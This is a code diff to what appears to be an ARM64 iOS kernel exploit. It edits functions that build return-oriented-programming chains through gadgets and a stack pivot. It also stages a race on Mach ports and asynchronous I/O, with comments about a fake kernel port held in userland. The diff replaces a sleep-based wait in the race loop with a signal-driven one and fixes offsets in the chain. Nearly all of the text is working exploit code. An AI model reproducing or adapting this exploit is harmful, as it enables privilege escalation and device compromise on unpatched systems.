@@ -280,7 +280,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
 						ADD_GADGET(); /* d9  (not 0) x26 (0) */
 						ADD_GADGET(); /* d8  (not 0) x25 (0) */
-						ADD_REL_OFFSET_GADGET(96/*our own chain*/+chain_for_loop_end /*the two calls below*/); /* x28 (not 0) x24 (0) */
+						ADD_REL_OFFSET_GADGET(96/*our own chain*/+(chain_per_break-36*8)/*the call below*/); /* x28 (not 0) x24 (0) */
 					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
 					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
 					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
@@ -543,7 +543,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
 						ADD_GADGET(); /* d9  (not 0) x26 (0) */
 						ADD_GADGET(); /* d8  (not 0) x25 (0) */
-						ADD_REL_OFFSET_GADGET(96/*our own chain*/+chain_loop_end /*the two calls below*/); /* x28 (not 0) x24 (0) */
+						ADD_REL_OFFSET_GADGET(96/*our own chain*/+(chain_per_break-36*8) /*the call below*/); /* x28 (not 0) x24 (0) */
 					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
 					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
 					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
@@ -638,14 +638,23 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ADD_COMMENT(name); \
 	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
 
-#if 0
 	char * buf[1024];
 	snprintf(&buf,sizeof(buf),"testing...");
-	DEFINE_ROP_VAR("test_string",sizeof(buf),&buf);
+	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);
 
+#if 0
+	uint64_t * test_break_val = malloc(8);
+	*test_break_val = 0;
+	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
 	ADD_LOOP_START("test_loop")
+		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("test_string",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
+		
+		// set x0 to the_one
+		SET_X0_FROM_ROP_VAR("test_break_val");
+		// break out of the loop if x0 is nonzero
+		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
 	ADD_LOOP_END();
 #else
 
@@ -653,7 +662,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	// SETUP VARS
 	char * tmp = malloc(0x1000);
 	memset(tmp,0,0x1000);
-	DEFINE_ROP_VAR("should_race",sizeof(mach_port_t),tmp); //
+	DEFINE_ROP_VAR("should_race",sizeof(uint64_t),tmp); //
 	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
 	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
 	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
@@ -1052,6 +1061,23 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
 	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
 
+	DEFINE_ROP_VAR("sigevent",sizeof(struct sigevent),tmp);
+	SET_ROP_VAR32_W_OFFSET("sigevent",offsetof(struct sigevent,sigev_notify),SIGEV_SIGNAL);
+	SET_ROP_VAR32_W_OFFSET("sigevent",offsetof(struct sigevent,sigev_signo),SIGWINCH);
+
+	DEFINE_ROP_VAR("signal_set",sizeof(sigset_t),tmp);
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("signal_set",1);
+	CALL("sigemptyset",0,0,0,0,0,0,0,0);
+	
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("signal_set",1);
+	CALL("sigaddset",0, SIGWINCH,0,0,0,0,0,0);
+
+	ROP_VAR_ARG_HOW_MANY(1);
+	ROP_VAR_ARG("signal_set",1);
+	CALL("sigprocmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);
+
 	// TODO: we can optimize this
 	for (uint32_t i = 0; i < NENT; i++) {
 		int offset = sizeof(struct aiocb) * i;
@@ -1067,19 +1093,22 @@ _STRUCT_ARM_THREAD_STATE64
 
 	//the framework doesn't support inner loops atm, so I hope this works... fingers crossed
 	ADD_LOOP_START("racer_loop");
-		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("aio_list",2);
+		ROP_VAR_ARG("sigevent",4);
 		CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
 		
-		// now we would spin and wait till aio completed the list, but that would require another loop
-		// so we just sleep and hope for the best 
-		ADD_USLEEP(100000);
+		ROP_VAR_ARG_HOW_MANY(1);
+		ROP_VAR_ARG64("reply_port",5); 
+		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, 1000, MACH_PORT_NULL,0);
 
 		// set x0 
 		SET_X0_FROM_ROP_VAR("should_race");
 		// break out of the loop if x0 is nonzero
 		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop");
 	ADD_LOOP_END();
+	
+	ADD_USLEEP(10000000);
 
 	// this thread wasn't spawned using pthread so we can't easily exit...
 	ADD_LOOP_START("endless_thread_loop");
